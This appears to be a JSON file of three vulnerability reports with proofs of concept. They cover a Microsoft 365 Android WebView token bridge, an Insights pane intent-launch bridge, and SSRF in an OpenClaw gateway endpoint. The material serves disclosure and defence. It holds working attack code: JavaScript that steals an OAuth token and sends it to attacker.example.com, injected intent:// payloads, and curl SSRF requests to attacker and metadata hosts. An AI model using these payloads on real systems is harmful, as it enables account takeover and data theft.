{"valid":true,"title":"DimeWebView OfficeMobile.getAuthToken — UUID Not Secret From JavaScript Enables OAuth Token Theft via XSS","summary":"## DimeWebView `OfficeMobile.getAuthToken` — Host-Only Origin Check with Readable UUID

The `DimeWebView` registers a `y1` class as the `"OfficeMobile"` JavaScript interface, exposing a `getAuthToken()` method that retrieves real Microsoft OAuth access tokens (via `LiveOAuthProxy` or `AuthenticationController.ExecuteAuthRequest`) and posts them back to JavaScript. Two checks protect this interface: (1) a host-equality check (`DimeWebView.a()`) comparing the current page URL's host to the initial URL's host (`content.lifecycle.office.net`), and (2) a UUID integrity check comparing the `str5` parameter against `dimeWebView.d`.

**The critical flaw is that the UUID secret is not secret.** In `onPageStarted` (i.java:62-69), a new UUID is generated and injected into the page via `evaluateJavascript()` as `window.OfficeMobile.integrityUUID = '<uuid>'`. Since the UUID is written into the page's JavaScript environment, any JavaScript running in that same page — including XSS payloads — can simply read `window.OfficeMobile.integrityUUID` and pass it as both the `str5` argument to `getAuthToken()`. The host check is also bypass-transparent since any page on `content.lifecycle.office.net` (the initial URL) passes it. Therefore, any XSS vulnerability on any page within `content.lifecycle.office.net` can call `OfficeMobile.getAuthToken(scopes, authHint, ..., callbackId, window.OfficeMobile.integrityUUID)` and receive a live OAuth token via the resolved callback `window.OfficeMobile.getAuthTokenResolved`.

The impact is **full OAuth access token exfiltration**. An attacker who achieves XSS on any page under `content.lifecycle.office.net` (the Microsoft 365 subscription/purchase flow) can steal the victim's OAuth access token for any requested scope. This token grants the attacker API-level access to the victim's Microsoft 365 account (OneDrive, Outlook, SharePoint, etc.) for the duration of the token's validity.","proofOfConcept":"**Prerequisites:** XSS capability on any page under `content.lifecycle.office.net` (the domain loaded by the DimePurchaseView).

**Steps to verify:**

1. Open Microsoft 365 Android app and trigger the in-app purchase/subscription flow (Go Premium flow), which loads `DimePurchaseView`.

2. The WebView loads `https://content.lifecycle.office.net/launchpad/v1/launchpad.union.html`. Any XSS on this domain's pages is in scope.

3. The XSS payload reads the UUID that was injected by native code:
```javascript
const uuid = window.OfficeMobile.integrityUUID;
```

4. Then calls `getAuthToken` with the UUID passed as the last parameter (both `callbackId` and UUID slot):
```javascript
// Set up the callback to receive the token
window.OfficeMobile.getAuthTokenResolved = function(result) {
  // Exfiltrate result.authToken to attacker's server
  fetch('https://attacker.example.com/steal?token=' + encodeURIComponent(result.authToken));
};
window.OfficeMobile.getAuthTokenReject = function(result) { };

// Read the UUID injected by native code (it is accessible to all JS in the page)
const uuid = window.OfficeMobile.integrityUUID;

// Call getAuthToken - scopes can request broad Microsoft API access
window.OfficeMobile.getAuthToken(
  ['https://graph.microsoft.com/.default'],  // scopes array
  '',             // authHint
  '',             // str2 (unused)
  'cb1',          // callbackId
  uuid,           // str5 (UUID integrity check - read directly from window)
  uuid            // last param
);
```

5. The `DimeWebView.a()` host check passes because the current page is on `content.lifecycle.office.net`.

6. The `a(str5, true)` UUID check passes because `str5` equals `dimeWebView.d` (the UUID was read from `window.OfficeMobile.integrityUUID` which was set via `evaluateJavascript` to exactly `dimeWebView.d`).

7. `getAuthToken` proceeds to call `LiveOAuthProxy.GetTicketResult()` or `AuthenticationController.ExecuteAuthRequest()` and returns a real OAuth token to `window.OfficeMobile.getAuthTokenResolved`, which sends it to the attacker.","severity":"high"}

{"valid":true,"title":"Arbitrary Intent Launch via InsightsPane WebView JavaScript Bridge (Navigate Message)","summary":"The `InsightsPaneContent.InsightsWebAppInterface` class registers a JavaScript interface named `"external"` on the Insights WebView (via `webView.addJavascriptInterface(...)` in `InsightsPane.java:68`). The `notify()` method, annotated with `@JavascriptInterface`, handles a `"Navigate"` message type by extracting a raw URL from the JSON payload and passing it directly to `InsightsPaneHelper.NavigateUrl()`, which calls `context.startActivity(new Intent("android.intent.action.VIEW", Uri.parse(str)))` with no scheme, host, or content validation whatsoever.

The WebView loads a Microsoft Insights/Bing-powered service URL. The `InsightsWebViewClient` does **not** implement `shouldOverrideUrlLoading`, meaning navigation within the WebView is unrestricted. If an attacker can inject JavaScript into the loaded page (e.g., via an XSS vulnerability in the Bing/Office Insights backend service, or via a man-in-the-middle attack if the connection is not properly pinned), the malicious script can call `window.external.notify('{"messageType":"Navigate","messageContent":"{\\"url\\":\\"intent://evil#Intent;scheme=intent;package=com.victim;end\\"}"}')` — and the bridge has zero origin checks, so any page loaded in the WebView can invoke it.

The `NavigateUrl` function fires an arbitrary `ACTION_VIEW` intent, enabling: (1) **open intent redirection** — launching arbitrary deep links in other apps installed on the device, (2) **custom URI scheme abuse** — invoking handlers of sensitive apps (banking, auth apps, etc.), and (3) on certain Android versions, **`intent://` URI exploitation** which can trigger specific Activity/Service launches with attacker-controlled extras. The impact includes cross-app privilege escalation, token/data theft from other apps via exported Activities, and potential code execution chains via vulnerable third-party app components.","proofOfConcept":"**Prerequisites:** A way to inject JavaScript into the page the Insights WebView loads (XSS in the Bing/Office Insights service endpoint, or MITM if no certificate pinning). The pane is triggered whenever a user uses the "Insights" / "Researcher" panel feature in M365 mobile.

**Steps to verify:**

1. Set up a MITM proxy (e.g., Burp Suite) intercepting traffic from the M365 app.

2. Open M365 on Android and trigger the Insights Pane (open a Word document → Review → Insights/Researcher → search for any term).

3. Intercept the response from the Insights service URL and inject the following JavaScript into the page body:
```html
<script>
window.external.notify(JSON.stringify({
  messageType: "Navigate",
  messageContent: JSON.stringify({
    url: "intent:#Intent;action=android.intent.action.VIEW;package=com.example.targetapp;end"
  })
}));
</script>
```

4. Observe that `InsightsPaneHelper.NavigateUrl()` is called with the attacker-controlled URL, resulting in `context.startActivity()` firing an arbitrary intent — launching the target app (or any other installed app's exported Activity).

5. For a more impactful PoC using `intent://` URI to demonstrate activity launch with extras:
```javascript
window.external.notify(JSON.stringify({
  messageType: "Navigate",
  messageContent: JSON.stringify({
    url: "intent://example.com#Intent;scheme=https;package=com.microsoft.teams;end"
  })
}));
```

**Expected result:** The target app/activity is launched without any user confirmation or security gate from the M365 app. No validation of scheme, host, or intent structure occurs anywhere in the `NavigateUrl` code path.","severity":"medium"}

{"valid":true,"title":"SSRF via default URL fetching in /v1/responses endpoint (authenticated clients can trigger arbitrary outbound HTTP requests)","summary":"The `/v1/responses` endpoint in `openclaw/src/gateway/openresponses-http.ts` enables URL fetching by default for both image inputs (`allowUrl: images?.allowUrl ?? true`, line 247) and file inputs (`resolveInputFileLimits()` defaults `allowUrl: true` at `input-files.ts:161`). Any authenticated API client can supply `{"type":"input_file","source":{"type":"url","url":"http://target.com/path"}}` or `{"type":"input_image","source":{"type":"url","url":"http://target.com/image"}}` in the request body, and the server will make an outbound HTTP request to that URL.

The SSRF guard (`fetchWithSsrFGuard`) is applied and blocks RFC1918, loopback, link-local, and known cloud metadata endpoints (e.g., `169.254.169.254`, `metadata.google.internal`). However, when `urlAllowlist` is not configured (the default), `normalizeInputHostnameAllowlist()` returns `undefined`, and `matchesHostnameAllowlist()` in `ssrf.ts:95` returns `true` for **all** hostnames when the allowlist is empty — meaning any public external host is reachable. The server will fetch attacker-controlled URLs, leaking the server's egress IP, enabling port scanning of non-RFC1918 ranges, timing attacks, and interaction with any external service (webhooks, C2 callbacks, SSRF pivot via DNS rebinding on next redirect hop up to 3 hops).

Impact: Any client that can authenticate to the gateway (valid bearer token) can cause the server to make arbitrary outbound HTTP/HTTPS requests to any public IP/hostname. This enables server IP disclosure, interaction with external services on behalf of the server, potential DNS rebinding attacks across redirect hops, and triggering PDF parsing on attacker-controlled content. The attack surface is wider than `/v1/chat/completions` which defaults `allowUrl: false`.","proofOfConcept":"## Prerequisites
- Valid bearer token for the OpenClaw gateway
- Network access to the `/v1/responses` endpoint
- A listening server (e.g., `nc -l 8080` or a requestbin/webhook.site URL) to capture incoming requests

## Steps

1. Start a listener to capture the SSRF callback:
```
# Use https://webhook.site or a VPS you control
RECEIVER="https://YOUR_WEBHOOK_URL"
```

2. Send a POST request to `/v1/responses` with a URL-type input_file:
```bash
curl -X POST http://TARGET_HOST/v1/responses \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer YOUR_TOKEN' \
  -d '{
    "model": "gpt-4o",
    "input": [
      {
        "type": "message",
        "role": "user",
        "content": [
          {
            "type": "input_file",
            "source": {
              "type": "url",
              "url": "https://YOUR_WEBHOOK_URL/ssrf-test",
              "media_type": "text/plain"
            }
          },
          {
            "type": "text",
            "text": "Summarize the file"
          }
        ]
      }
    ]
  }'
```

3. Observe on your listener that an HTTP GET request arrives from the server's IP address with User-Agent `OpenClaw-Gateway/1.0`. This confirms the server fetched the attacker-supplied URL.

4. To confirm images also work:
```bash
curl -X POST http://TARGET_HOST/v1/responses \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer YOUR_TOKEN' \
  -d '{
    "model": "gpt-4o",
    "input": [
      {
        "type": "message",
        "role": "user",
        "content": [
          {
            "type": "input_image",
            "source": {
              "type": "url",
              "url": "https://YOUR_WEBHOOK_URL/ssrf-image"
            }
          },
          {"type": "text", "text": "Describe this image"}
        ]
      }
    ]
  }'
```

5. Blocked example (confirming SSRF guard is active but limited):
```bash
# This will be blocked:
curl ... -d '{..."url": "http://169.254.169.254/latest/meta-data/"}'
# This will NOT be blocked (public IP, no allowlist configured):
curl ... -d '{..."url": "http://attacker.com:8080/callback"}'
```

**Note**: The vulnerability requires a valid authentication token. Without explicit `urlAllowlist` configuration in the gateway config, all public hosts are reachable.","severity":"medium"}

